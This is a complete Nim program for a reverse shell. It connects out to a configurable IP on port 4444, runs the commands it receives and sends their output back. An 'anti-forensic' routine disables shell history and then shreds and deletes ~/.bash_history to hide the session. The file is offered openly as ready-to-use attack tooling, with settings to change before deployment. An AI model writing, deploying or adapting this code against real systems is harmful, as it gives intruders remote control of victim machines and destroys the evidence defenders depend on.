import std/net, std/osproc, std/strutils, std/private/ospaths2, std/dirs, std/os

let IP: string = "127.0.0.1" # Change this (obviously)

let anti: bool = true # Make this false, if you don't want to use the anti forensics feature, otherwise keep it true.


proc anti_forensic(MY_SOCKET: Socket, finish: bool): void =
    if not finish:

        MY_SOCKET.send("[+] (First procedure) Starting anti_forensic procedure. \n")
        MY_SOCKET.send("[NOTE] Please don't CTRL+C just enter exit, to finish the anti_forensic procedure. \n")

        let result1 = execProcess("export HISTSIZE=0") 

        MY_SOCKET.send("[+] First anti_forensic procedure done. \n")
    else:
        MY_SOCKET.send("[+] (Last procedure) Finishing the anti_forensic procedure. \n")

        let result2 = execProcess("shred -f -n 3 ~/.bash_history") # Shredding just in case.
        let result3 = execProcess("rm -f ~/.bash_history")

        MY_SOCKET.send("[+] Last anti_forensic procedure done. \n")
        
proc reverse_shell(): void =

    try:
        var cd_cond = false
        let socket = newSocket()
        socket.connect(IP, Port(4444)) # Change the port if needed

        if anti:
            anti_forensic(socket, false)

        while true:
            try:
                let current_dir = getCurrentDir()
                socket.send("Current directory: " & "( " & current_dir & " )" & " ")
                let command = socket.recvLine()
            
                if not isEmptyOrWhitespace(command):

                    if command.startsWith("cd"):
                        let cd_pos: int  = command.find("cd")
                        cd_cond = true 
                        
                        if cd_pos != -1:
                            let start_pos: int = cd_pos + "cd".len() + 1

                            let cd_command = command[start_pos..^1]

                            setCurrentDir(cd_command)
                            

                    let result_command = execProcess(command)

                    if cd_cond:
                        cd_cond = false
                    
                    else:
                        socket.send(result_command)

                    if command == "exit":
                        if anti:
                            anti_forensic(socket, true)
                        break
                
            except Exception as e:
                echo e.msg

        defer: socket.close()

    except OSError as e:
        echo e.msg 


reverse_shell()
